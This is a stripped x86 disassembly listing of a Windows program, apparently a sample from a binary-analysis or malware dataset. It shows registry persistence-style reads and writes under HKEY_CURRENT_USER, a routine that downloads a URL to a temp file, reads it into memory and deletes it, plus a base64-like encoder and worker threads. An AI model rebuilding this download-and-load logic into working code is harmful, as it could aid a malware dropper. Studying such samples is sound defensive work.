mov [ esi ] al
mov al 0x1
jmp r-xdata
mov dl [ esi ]
dec eax
jne r-xdata
pop edi
pop esi
leave
retn
mov cl [ ebp + eax - 0x43 ]
inc eax
test cl cl
jne r-xdata
cmp [ ecx + eax ] 0x0
je r-xdata
cmp cl dl
jne r-xdata
sub_40a406
push esi
mov esi [ esp + 0x8 ]
movzx edx [ esi ]
jmp r-xdata
test dl dl
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov al 0x1
pop esi
retn
push edx
call sub_40a29a
test al al
pop ecx
jne r-xdata
inc esi
dec [ esp + 0xc ]
mov dl [ esi ]
mov al dl
sub al 0x30
cmp al 0x9
jbe r-xdata
push edx
call sub_40a2b6
test al al
pop ecx
je r-xdata
xor al al
pop esi
retn
sub_40a448
push ebx
push esi
push 0x104
mov ebx ecx
call sub_405340
mov esi eax
test esi esi
pop ecx
je r-xdata
pop esi
pop ebx
retn 0x4
push edi
push [ esp + 0x10 ]
call sub_409c76
mov edi eax
inc edi
mov eax 0x100
cmp edi eax
pop ecx
jbe r-xdata
push edi
push [ esp + 0x14 ]
push esi
call sub_405366
mov [ edi + esi ] 0x0
lea eax [ ebx + 0x21d ]
mov ecx [ eax ]
add esp 0xc
mov [ esi + 0x100 ] ecx
mov [ eax ] esi
pop edi
mov edi eax
sub_40a49e
push esi
mov esi ecx
cmp [ esi + 0x219 ] 0x0
jne r-xdata
mov eax [ esi + 0x219 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x21d ]
mov [ esi + 0x219 ] eax
push eax
mov [ esi + 0x221 ] 0x1
call sub_40ab22
mov eax [ esi + 0x219 ]
mov eax [ eax + 0x100 ]
mov ecx esi
mov [ esi + 0x219 ] eax
call sub_40abb6
test al al
setne al
pop esi
retn
xor al al
pop esi
retn
sub_40a4f1
push ebp
mov ebp esp
sub esp 0x120
push ebx
push esi
push edi
xor ebx ebx
mov esi ecx
push ebx
lea edi [ esi - 0x22a ]
push rw-data
push edi
call sub_409cdd
mov eax [ esi - 0x12a ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi - 0x116 ]
push eax
push edi
call sub_409cb9
add esp 0x14
push ebx
push rw-data
mov [ ebp - 0x20 ] bl
call sub_402a88
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_409cdd
lea edi [ ebp - 0x20 ]
add esp 0xc
mov bl 0x30
dec edi
inc bl
cmp bl 0x39
jl r-xdata
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ esi - 0x332 ]
call sub_40a448
lea eax [ ebp - 0x20 ]
push eax
call sub_409c76
push 0x3d
mov [ eax + edi ] bl
push 0x100
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x18
test al al
je r-xdata
mov eax [ esi - 0x115 ]
lea ecx [ esi - 0x332 ]
mov [ esi - 0x119 ] eax
call sub_40aa44
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_40a5b3
push esi
mov esi ecx
jmp r-xdata
cmp [ esi + 0x21d ] 0x0
jne r-xdata
mov eax [ esi + 0x21d ]
mov ecx [ eax + 0x100 ]
push eax
mov [ esi + 0x21d ] ecx
call sub_405354
pop ecx
pop esi
retn
sub_40a626
push esi
mov esi ecx
mov [ esi ] rw-data
lea eax [ esi + 0x208 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x208 ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ ecx + esi + 0x208 ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov [ ecx + esi + 0x208 ] rw-data
mov eax [ eax ]
mov eax [ eax + 0xc ]
lea ecx [ eax - 0x12a ]
mov [ eax + esi + 0x204 ] ecx
mov ecx esi
call sub_40a5b3
mov ecx esi
pop esi
jmp sub_4032e3
sub_40a693
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] ebx
je r-xdata
push ebx
mov ecx esi
call sub_40b23e
mov [ esi ] rw-data
lea eax [ esi + 0x208 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x208 ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ ecx + esi + 0x208 ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov [ ecx + esi + 0x208 ] rw-data
mov eax [ eax ]
mov eax [ eax + 0xc ]
lea ecx [ eax - 0x12a ]
mov [ eax + esi + 0x204 ] ecx
mov [ esi + 0x21d ] ebx
mov [ esi + 0x219 ] ebx
mov [ esi + 0x221 ] bl
mov eax esi
pop esi
pop ebx
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x222 ] rw-data
lea ecx [ esi + 0x332 ]
mov [ esi + 0x32a ] rw-data
call sub_40a8fa
sub_40a757
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
xor edi edi
push edi
push edi
push 0x1a
push edi
call [ SHGetFolderPathA@IAT ]
push edi
push rw-data
call sub_402a88
pop ecx
push eax
push esi
call sub_409c88
pop ecx
push eax
call sub_409cdd
add esp 0xc
push edi
push esi
call [ CreateDirectoryA@IAT ]
pop edi
pop esi
retn 0x4
sub_40a79a
push esi
mov esi ecx
mov eax [ esi + 0x10c ]
cmp eax 0x10
jae r-xdata
cmp eax 0x20
jae r-xdata
push 0x20
push [ esp + 0xc ]
call sub_4056db
test al al
pop ecx
pop ecx
jne r-xdata
push 0x7
push [ esp + 0xc ]
call sub_409c88
pop ecx
push eax
push edi
mov edi [ esp + 0xc ]
push 0x20
push edi
call sub_4056db
test al al
pop ecx
pop ecx
jne r-xdata
inc [ esi + 0x10c ]
pop esi
retn 0x4
push 0x7
push [ esp + 0xc ]
jmp r-xdata
push ebx
push edi
call sub_409c76
mov ebx eax
call sub_405fc3
xor edx edx
div ebx
add edx edi
push edx
call sub_40a39d
pop ecx
pop ecx
pop ebx
push 0x7
push edi
call sub_4056a3
pop ecx
pop ecx
jmp r-xdata
call sub_4056a3
pop ecx
pop ecx
pop edi
jmp r-xdata
sub_40a828
push ebp
mov ebp esp
sub esp 0x400
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov eax [ esi - 0x22d ]
mov eax [ eax + 0xc ]
lea ecx [ eax + esi - 0x22d ]
call sub_40a9c8
push 0x3d
push 0x400
lea eax [ ebp - 0x400 ]
push eax
push rw-data
mov [ ebp - 0x400 ] 0x0
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
pop esi
leave
retn 0x4
push 0x0
lea eax [ ebp - 0x400 ]
push eax
add esi 0xfffffbd3
push esi
call sub_409cdd
add esp 0xc
sub_40a899
push esi
xor eax eax
push eax
push eax
push 0x1
push eax
call [ CreateEventA@IAT ]
push [ esp + 0x8 ]
mov esi eax
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
pop esi
retn 0x4
sub_40a8bf
cmp [ esp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
push 0x8
push [ esp + 0x10 ]
lea eax [ esi + 0x4 ]
push eax
call sub_409f71
add esp 0xc
mov al 0x1
pop esi
retn 0x8
push 0x8
push [ esp + 0xc ]
add esi 0x14
push esi
call sub_409f71
add esp 0xc
sub_40a8fa
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push 0x10
push eax
mov [ esi ] rw-data
call sub_405388
lea eax [ esi + 0x14 ]
push 0x10
push eax
call sub_405388
add esp 0x10
mov eax esi
pop esi
retn
sub_40a920
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x8 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
je r-xdata
push esi
push edi
push 0x4
pop esi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov edi rw-data
push edi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] esi
call sub_402a88
pop ecx
push eax
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
leave
retn
mov [ ebp - 0x4 ] esi
call sub_405fc3
push esi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
push 0x0
push edi
call sub_402a88
pop ecx
push eax
push [ ebp - 0x8 ]
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0xc ]
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_40a9c8
push esi
mov esi ecx
call sub_40a920
push 0x8
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_409f71
add esp 0xc
push 0x3d
push 0x3fc
add esi 0x14
push esi
push rw-data
call sub_402a88
pop ecx
push eax
push [ esp + 0x18 ]
call sub_40a1d9
add esp 0x14
pop esi
retn 0x4
sub_40aa06
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x4 ] rw-data
mov eax esi
pop esi
leave
retn 0x4
lea ecx [ esi + 0x208 ]
mov [ esi + 0x4 ] rw-data
call sub_40a8fa
sub_40aa44
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor al al
lea eax [ ebp - 0xc ]
push eax
lea eax [ esi + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
add esi 0x108
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0xc ] 0x100
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x8 ] 0x4
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov al 0x1
jmp r-xdata
pop esi
leave
retn
sub_40aabd
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push 0x80000001
call [ RegCreateKeyA@IAT ]
test eax eax
je r-xdata
push ebx
push edi
lea edi [ esi + 0x8 ]
push edi
call sub_409c76
pop ecx
push eax
push edi
push 0x1
xor ebx ebx
push ebx
add esi 0x108
push esi
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
test eax eax
je r-xdata
xor al al
mov bl 0x1
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
mov al bl
pop ebx
jmp r-xdata
pop esi
leave
retn
sub_40ab22
push esi
mov esi [ esp + 0x8 ]
cmp [ esi ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
mov al 0x1
pop esi
retn 0x4
push esi
call sub_409c76
cmp eax 0x100
pop ecx
jae r-xdata
push 0x0
push esi
add edi 0x8
push edi
call sub_409cdd
add esp 0xc
sub_40ab74
push esi
push edi
mov edi [ esp + 0xc ]
push rw-data
push edi
mov esi ecx
call sub_409cb9
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea eax [ eax + esi + 0x18 ]
push eax
push edi
call sub_409cb9
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea eax [ eax + esi + 0x8 ]
push eax
push edi
call sub_409cb9
add esp 0x18
pop edi
pop esi
retn 0x8
sub_40abb6
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
mov esi ecx
mov eax [ esi ]
push edi
call [ eax ]
mov edi eax
push edi
call sub_405340
pop ecx
mov ebx eax
mov eax [ esi ]
push edi
push ebx
mov ecx esi
call [ eax + 0x4 ]
lea eax [ ebp - 0x40c ]
push eax
push 0x400
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x40c ]
push eax
push 0x5
push rw-data
push eax
call [ GetTempFileNameA@IAT ]
push ebx
call [ DeleteUrlCacheEntryA@IAT ]
xor edi edi
push edi
push edi
lea eax [ ebp - 0x40c ]
push eax
push ebx
push edi
call URLDownloadToFileA
push ebx
mov [ ebp - 0x4 ] eax
call sub_405354
cmp [ ebp - 0x4 ] edi
pop ecx
jne r-xdata
xor al al
push edi
push edi
push 0x3
push edi
push 0x1
push 0x80000000
lea eax [ ebp - 0x40c ]
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
push edi
push eax
call [ GetFileSize@IAT ]
mov ebx eax
cmp ebx edi
jbe r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebx + 0x1 ]
push eax
call sub_405340
cmp eax edi
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
push edi
lea ecx [ ebp - 0xc ]
push ecx
push ebx
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_405354
pop ecx
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call [ DeleteFileA@IAT ]
cmp [ ebp - 0xc ] edi
jbe r-xdata
push [ ebp - 0xc ]
mov eax [ esi ]
push [ ebp - 0x4 ]
mov ecx esi
call [ eax + 0x8 ]
push [ ebp - 0x4 ]
mov bl al
call sub_405354
pop ecx
mov al bl
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40ace4
push ebx
push esi
mov esi ecx
push edi
lea edi [ esi + 0x208 ]
mov eax [ edi ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi + 0x21c ]
push eax
call sub_409c76
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi + 0x20c ]
push eax
call sub_409c76
pop ecx
pop ecx
mov ecx esi
lea edi [ ebx + eax ]
call sub_40ab53
lea eax [ eax + edi + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_40ad4c
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x10 ]
mov edi ecx
push esi
lea ecx [ edi + 0x208 ]
call sub_40294c
sub esi eax
add esi [ esp + 0x10 ]
test eax eax
je r-xdata
xor al al
cmp esi 0x10
jbe r-xdata
mov edx [ edi ]
push esi
push eax
mov ecx edi
call [ edx + 0x10 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_40ad85
cmp [ esp + 0x4 ] 0x0
mov eax ecx
je r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ eax + ecx ] rw-data
retn 0x4
mov [ eax ] rw-data
mov [ eax + 0x4 ] rw-data
mov [ eax + 0x10c ] rw-data
sub_40adfd
push ebx
push esi
mov esi ecx
push edi
lea edi [ esi + 0x208 ]
mov eax [ edi ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi + 0x21c ]
push eax
call sub_409c76
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi + 0x20c ]
push eax
call sub_409c76
pop ecx
pop ecx
mov ecx esi
lea edi [ ebx + eax ]
call sub_40ab53
mov ecx [ esi + 0x210 ]
add eax edi
pop edi
pop esi
lea eax [ eax + ecx * 2 + 0x3 ]
pop ebx
retn
sub_40ae4f
push esi
push edi
push [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
mov esi ecx
push edi
lea ecx [ esi + 0x208 ]
call sub_4028d2
mov ecx esi
mov [ esi + 0x210 ] eax
mov [ esi + 0x20c ] edi
call sub_40abb6
pop edi
pop esi
retn 0x8
sub_40ae7f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x44
cmp eax 0x40
push esi
push edi
push 0x10
pop ecx
mov esi rw-data
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edi
pop esi
jae r-xdata
mov al 0x3d
mov al [ ebp + eax - 0x44 ]
jmp r-xdata
leave
retn 0x4
sub_40aeab
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
xor edx edx
cmp [ ebp + 0xc ] ebx
push esi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
jle r-xdata
mov [ edx + esi ] 0x0
pop esi
mov al 0x1
pop ebx
leave
retn 0xc
push edi
push edi
call sub_40ae7f
mov [ edx + esi ] al
inc edx
mov [ edx + esi ] 0x3d
mov eax [ ebp + 0x8 ]
mov al [ ebx + eax ]
inc ebx
mov [ ebp + 0x10 ] ebx
movzx ebx al
mov eax ebx
shr eax 0x4
or edi eax
push edi
call sub_40ae7f
mov edi [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
and ebx 0xf
mov [ edx + esi ] al
inc edx
shl ebx 0x2
cmp edi [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov al [ ebx + eax ]
mov ecx [ ebp - 0x4 ]
movzx edi al
mov eax edi
shr eax 0x2
push eax
inc ebx
call sub_40ae7f
mov ecx [ ebp - 0x4 ]
and edi 0x3
mov [ edx + esi ] al
inc edx
shl edi 0x4
cmp ebx [ ebp + 0xc ]
jge r-xdata
pop edi
push ebx
call sub_40ae7f
mov ebx [ ebp + 0x10 ]
mov [ edx + esi ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ edi + eax ]
inc edi
mov [ ebp + 0x10 ] edi
movzx edi al
mov eax edi
shr eax 0x6
or ebx eax
push ebx
call sub_40ae7f
mov ecx [ ebp - 0x4 ]
and edi 0x3f
mov [ edx + esi ] al
push edi
inc edx
call sub_40ae7f
mov ebx [ ebp + 0x10 ]
mov [ edx + esi ] al
jmp r-xdata
inc edx
mov [ edx + esi ] 0x3d
inc edx
cmp ebx [ ebp + 0xc ]
jl r-xdata
sub_40afaf
push esi
push edi
push [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
push edi
mov esi ecx
call sub_40ab74
push rw-data
push edi
call sub_409cb9
pop ecx
pop ecx
push 0x0
push [ esi + 0x21c ]
push edi
call sub_409c88
pop ecx
push eax
call sub_409d93
push eax
push edi
call sub_409cb9
push rw-data
push edi
call sub_409cb9
movzx eax [ esi + 0x23d ]
add esp 0x1c
push 0x0
push eax
push edi
call sub_409c88
pop ecx
push eax
call sub_409d93
push eax
push edi
call sub_409cb9
add esp 0x14
pop edi
pop esi
retn 0x8
sub_40b01e
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x242 ]
xor ebx ebx
add eax 0x10
push edi
push eax
mov [ esi + 0x21c ] ebx
mov [ esi + 0x220 ] ebx
mov [ esi + 0x228 ] 0x1
mov [ esi + 0x23d ] bl
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x8 ] ebx
mov [ esi + 0x224 ] eax
call sub_405340
mov edi eax
cmp edi ebx
pop ecx
jne r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
push [ ebp + 0x8 ]
lea eax [ eax + esi + 0x208 ]
lea ecx [ eax + 0x8 ]
call sub_4059dd
test al al
je r-xdata
xor al al
jmp r-xdata
push edi
call sub_405354
mov al [ ebp - 0x1 ]
pop ecx
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x10 ]
lea ecx [ eax + esi + 0x208 ]
call sub_40588f
mov [ esi + 0x234 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax [ esi + 0x224 ]
mov ecx [ esi + 0x208 ]
or [ esi + 0x220 ] 0xffffffff
mov ecx [ ecx + 0x14 ]
sub eax 0x10
push eax
lea ecx [ ecx + esi + 0x208 ]
lea eax [ edi + 0x10 ]
push eax
add ecx 0x8
call sub_4059fd
cmp eax ebx
mov [ esi + 0x218 ] eax
mov ecx esi
je r-xdata
jmp r-xdata
push 0x10
push edi
mov [ esi + 0x23d ] 0x1
call sub_40ae4f
mov [ ebp - 0x1 ] 0x1
or [ esi + 0x220 ] 0xffffffff
add eax 0x10
push eax
push edi
call sub_40ae4f
mov eax [ esi + 0x220 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
lea ecx [ eax + esi + 0x210 ]
call sub_405b1b
sub eax [ esi + 0x21c ]
mov [ ebp - 0x8 ] ebx
dec eax
cmp eax ebx
mov [ esi + 0x228 ] eax
jle r-xdata
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
cmp [ esi + 0x228 ] ebx
jge r-xdata
mov ecx [ esi + 0x242 ]
imul ecx eax
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x10 ]
push ecx
lea ecx [ eax + esi + 0x208 ]
call sub_4058e9
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
inc [ ebp - 0x8 ]
push 0x3e8
lea ecx [ eax + esi + 0x208 ]
call sub_40a899
mov eax [ esi + 0x242 ]
imul eax [ esi + 0x21c ]
push eax
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x10 ]
lea ecx [ eax + esi + 0x208 ]
call sub_40589e
jmp r-xdata
mov eax [ esi + 0x220 ]
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0xc ]
inc eax
and eax 0x7ff
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea ecx [ eax + esi + 0x208 ]
je r-xdata
mov eax [ esi + 0x242 ]
imul eax [ esi + 0x220 ]
push eax
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x10 ]
lea ecx [ eax + esi + 0x208 ]
call sub_40589e
push 0x4e20
push 0x14
jmp r-xdata
call sub_40a899
sub_40b23e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov esi ecx
je r-xdata
lea edi [ esi + 0x208 ]
push 0x0
mov ecx edi
call sub_403236
push 0x0
mov ecx esi
call sub_40aa06
mov eax [ edi ]
mov [ esi ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ edi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ edi ]
mov eax [ eax + 0xc ]
push 0x80
push rw-data
mov ecx edi
mov [ eax + esi + 0x208 ] rw-data
call sub_402a59
lea eax [ esi + 0x8 ]
push 0x100
push eax
call sub_405388
pop ecx
pop ecx
pop edi
mov eax esi
pop esi
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x219 ] rw-data
lea ecx [ esi + 0x325 ]
mov [ esi + 0x321 ] rw-data
call sub_40a8fa
sub_40b2f7
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov esi ecx
je r-xdata
lea edi [ esi + 0x208 ]
push 0x0
mov ecx edi
call sub_40ad85
push 0x0
mov ecx esi
call sub_40aa06
mov eax [ edi ]
mov [ esi ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ edi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ edi ]
mov eax [ eax + 0xc ]
push 0x80
push rw-data
mov ecx edi
mov [ eax + esi + 0x208 ] rw-data
call sub_402a59
pop edi
mov eax esi
pop esi
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x214 ] rw-data
lea ecx [ esi + 0x320 ]
mov [ esi + 0x31c ] rw-data
call sub_40a8fa
sub_40b3a0
push esi
push edi
push [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
push edi
mov esi ecx
call sub_40ab5f
push [ esp + 0x10 ]
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0xc ]
push rw-data
push edi
call sub_409cb9
push edi
call sub_409c76
add esp 0xc
add eax edi
push eax
push [ esi + 0x210 ]
mov ecx esi
push [ esi + 0x20c ]
call sub_40aeab
pop edi
pop esi
retn 0x8
sub_40b3ed
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
cmp eax 0xffffffff
push [ ebp + 0x8 ]
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
neg eax
sbb eax eax
inc eax
push [ ecx + 0x8 ]
call [ WaitForSingleObject@IAT ]
xor eax eax
jmp r-xdata
leave
retn 0x8
sub_40b46d
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push esi
mov esi [ esp + 0xc ]
push 0xa
push [ esi + 0x18 ]
call ebx
cmp eax 0x102
jne r-xdata
pop esi
xor eax eax
pop ebx
retn
push ebp
mov ebp [ SetEvent@IAT ]
push edi
mov edi [ ResetEvent@IAT ]
pop edi
pop ebp
push [ esi + 0xc ]
call edi
push [ esi + 0x8 ]
call edi
push [ esi + 0x10 ]
call ebp
mov eax [ esi ]
mov ecx esi
call [ eax ]
push [ esi + 0x14 ]
call edi
push [ esi + 0x10 ]
call edi
push [ esi + 0xc ]
call ebp
push 0xa
push [ esi + 0x18 ]
call ebx
cmp eax 0x102
je r-xdata
push 0xffffffff
push [ esi + 0x14 ]
call ebx
push 0x0
push [ esi + 0x18 ]
call ebx
test eax eax
je r-xdata
sub_40b4e0
push esi
mov esi ecx
push edi
mov [ esi ] rw-data
call sub_40b42a
push [ esi + 0x18 ]
mov edi [ SetEvent@IAT ]
call edi
push [ esi + 0x14 ]
call edi
push [ esi + 0x10 ]
call edi
push 0xffffffff
push [ esi + 0x4 ]
call [ WaitForSingleObject@IAT ]
push [ esi + 0x10 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ esi + 0x8 ]
call edi
push [ esi + 0xc ]
call edi
push [ esi + 0x14 ]
call edi
push [ esi + 0x18 ]
call edi
push [ esi + 0x4 ]
call edi
pop edi
pop esi
retn
sub_40b553
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ CreateEventA@IAT ]
xor ebx ebx
push ebx
xor ebp ebp
inc ebp
push ebp
push ebp
mov esi ecx
push ebx
mov [ esi ] rw-data
call edi
push ebx
push ebx
push ebp
push ebx
mov [ esi + 0x8 ] eax
call edi
push ebx
push ebx
push ebp
push ebx
mov [ esi + 0x10 ] eax
call edi
push ebx
push ebx
push ebp
push ebx
mov [ esi + 0x14 ] eax
call edi
push ebx
push ebp
push ebp
push ebx
mov [ esi + 0x18 ] eax
call edi
mov [ esi + 0xc ] eax
lea eax [ esp + 0x10 ]
push eax
push ebx
push esi
push sub_40b46d
push 0x100000
push ebx
call [ CreateThread@IAT ]
push 0xfffffff1
push eax
mov [ esi + 0x4 ] eax
call [ SetThreadPriority@IAT ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_40b5f0
push ebp
mov ebp esp
sub esp 0x8
call sub_40b8c0
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffff7
jmp r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jl r-xdata
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
jl r-xdata
cmp [ ebp + 0x14 ] 0xfa
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov [ ebp + 0x14 ] 0x1e
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x24 ] sub_40b8f0
push 0x1
push 0xd9b0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
call ecx
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] sub_40b910
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0xc ]
imul ecx ecx 0x186a0
mov [ ebp - 0x4 ] ecx
push 0x1
mov edx [ ebp - 0x4 ]
shl edx 0x2
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
call eax
add esp 0xc
mov ecx [ ebp - 0x8 ]
